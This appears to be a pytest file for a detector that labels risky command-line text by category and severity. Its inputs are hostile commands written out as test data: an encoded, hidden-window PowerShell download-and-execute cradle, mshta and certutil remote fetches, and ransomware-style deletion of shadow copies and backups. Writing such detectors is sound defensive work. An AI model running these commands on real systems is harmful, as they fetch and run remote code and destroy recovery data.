"""Tests for the risk-reason detector (cyberlab.risk_reasons)."""
from __future__ import annotations
import base64

from cyberlab.risk_reasons import detect_risk_reasons


def _label_set(reasons):
    return {r["label"] for r in reasons}


def test_powershell_encoded_detects_key_reasons():
    ps_inner = 'IEX (New-Object Net.WebClient).DownloadString("http://45.137.21.90/beacon.ps1")'
    enc = base64.b64encode(ps_inner.encode("utf-16-le")).decode()
    payload = f"powershell.exe -nop -w hidden -e {enc}\n{ps_inner}"
    reasons = detect_risk_reasons(payload, iocs=[
        {"type": "url", "value": "http://45.137.21.90/beacon.ps1"},
        {"type": "ipv4", "value": "45.137.21.90"},
    ])
    labels = _label_set(reasons)
    assert "PowerShell -EncodedCommand detected" in labels
    assert "Hidden window flag" in labels
    assert "Invoke-Expression (IEX) call" in labels
    assert "DownloadString network call" in labels
    assert "Malicious URL indicator" in labels
    # Ordered: at least one high-severity reason comes before medium/low.
    severities = [r["severity"] for r in reasons]
    assert severities.index("high") < severities.index("medium")


def test_mshta_lolbin():
    reasons = detect_risk_reasons("mshta.exe http://x.example.com/a.hta", iocs=[])
    labels = _label_set(reasons)
    assert "mshta.exe LOLBin" in labels
    assert "HTTP(S) URL present" in labels


def test_ransomware_impact():
    txt = ("vssadmin.exe delete shadows /all /quiet\n"
           "bcdedit /set {default} recoveryenabled No\n"
           "wbadmin delete catalog -quiet")
    reasons = detect_risk_reasons(txt, iocs=[{"type": "btc", "value": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"}])
    labels = _label_set(reasons)
    assert "Shadow-copy deletion (vssadmin)" in labels
    assert "Backup deletion (wbadmin)" in labels
    assert "Recovery disabled (bcdedit)" in labels
    assert "Bitcoin wallet (ransom indicator)" in labels
    assert all(r["severity"] in {"high", "medium", "low"} for r in reasons)


def test_certutil_download():
    reasons = detect_risk_reasons(
        "certutil.exe -urlcache -split -f https://185.220.101.42/evil.txt evil.exe",
        iocs=[{"type": "url", "value": "https://185.220.101.42/evil.txt"}],
    )
    labels = _label_set(reasons)
    assert "certutil download/decode" in labels
    assert "HTTP(S) URL present" in labels


def test_no_reasons_for_benign():
    reasons = detect_risk_reasons("hello world", iocs=[])
    assert reasons == []


def test_categories_are_valid():
    valid = {"encoding", "execution", "lolbin", "network", "persistence",
             "impact", "credential", "recon", "forensic"}
    reasons = detect_risk_reasons(
        "powershell -nop -w hidden IEX (iwr http://bad.com/x.ps1) "
        "vssadmin delete shadows Get-CimInstance Win32_OperatingSystem",
        iocs=[],
    )
    for r in reasons:
        assert r["category"] in valid, f"Unknown category: {r['category']}"


def test_dedup_by_label():
    reasons = detect_risk_reasons("mshta.exe a mshta.exe b mshta.exe c", iocs=[])
    labels = [r["label"] for r in reasons]
    assert labels.count("mshta.exe LOLBin") == 1
